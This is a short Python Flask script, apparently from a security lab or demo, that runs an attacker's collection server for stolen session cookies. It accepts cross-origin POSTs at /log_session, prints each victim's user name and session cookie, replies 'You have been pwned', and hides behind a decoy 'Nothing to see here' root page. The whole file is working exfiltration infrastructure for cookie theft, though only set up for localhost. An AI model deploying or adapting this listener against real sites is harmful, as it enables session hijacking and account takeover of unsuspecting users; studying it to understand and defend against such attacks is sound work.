from flask import Flask, request, abort
from flask_cors import CORS
import logging
app = Flask(__name__)
cors = CORS(app, resources={"/log_session": {"origins": "http://localhost:5001"}})  # allow cross-origin requests
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

LISTENER_PORT = 5003


@app.route("/")
def hello():
    return "Nothing to see here."


@app.route("/log_session", methods=['POST'])
def log_session():
    payload = request.get_json(silent=True)
    if payload is not None:
        print(f" + Got session cookie for {payload['user']}: \n\t{payload['session']}")
        return "You have been pwned"
    else:
        abort(400)


if __name__ == '__main__':
    print(f" * Listening for session cookies on port {LISTENER_PORT}...")
    app.run(port=LISTENER_PORT)
